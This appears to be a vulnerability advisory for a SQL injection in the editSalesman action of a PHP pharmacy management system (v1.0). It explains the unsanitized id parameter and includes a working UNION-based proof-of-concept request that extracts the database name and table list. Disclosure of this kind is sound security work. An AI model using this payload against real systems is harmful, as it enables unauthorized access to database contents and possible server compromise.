# pms editSalesman SQL injection vulnerability

## NAME OF AFFECTED PRODUCT(S)

**pharmacy-management-system-in-php-with-source-code**

### Vendor Homepage

https://code-projects.org/pharmacy-management-system-in-php-with-source-code/

###  **Manufacturers sites:**

 https://code-projects.org/

## AFFECTED AND/OR FIXED VERSION(S)

### VERSION

-  v1.0

### Software Link

 https://download-media.code-projects.org/2020/10/Pharmacy_Management_System_In_PHP_With_Source_Code.zip

### **AFFECTED FUNCION**

editSalesman

## PROBLEM TYPE

### Vulnerability Type

- sql injection

### Root Cause

- editSalesman

  Int action of edit Salesman ,The id parameter is obtained and saved to Salesmanid, and the application statement is spliced, and there is a vulnerability in the application injection

  ![image-20240816210200985](https://github.com/user-attachments/assets/43e3036a-71c1-4fbf-a593-7e67b369ace4)

## **Description of the vulnerability**

pharmacy_Management_System latest version has SQL injection via editSalesman, which can get information about the database and even GetShell via SQL injection

## **Vulnerability recurrence**

We need to set up this PMS website locally

Let's open the  /Index.php?id=allSalesman route

![image-20240723135616912](https://github.com/user-attachments/assets/351a00ed-dfaf-4d7f-8a72-3642e28d830d)



![image-20240723142715784-1723812909090](https://github.com/user-attachments/assets/817d8f0e-6138-4ba1-872d-240ee99f73bb)

![image-20240723142737947-1723812909090](https://github.com/user-attachments/assets/732fb69a-6417-4d66-98fc-f2f5371ecea9)

**POC**

```
GET /index.php?action=editSalesman&id=10}'+union+select+1,database(),(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),4,5,6,7,8+order+by+id+limit+0,1--+ HTTP/1.1
```

**Result**

![image-20240723142821268-1723812909091](https://github.com/user-attachments/assets/22ced658-2f56-4f92-8192-19e086b9eb57)



## Discover

PingXinyao

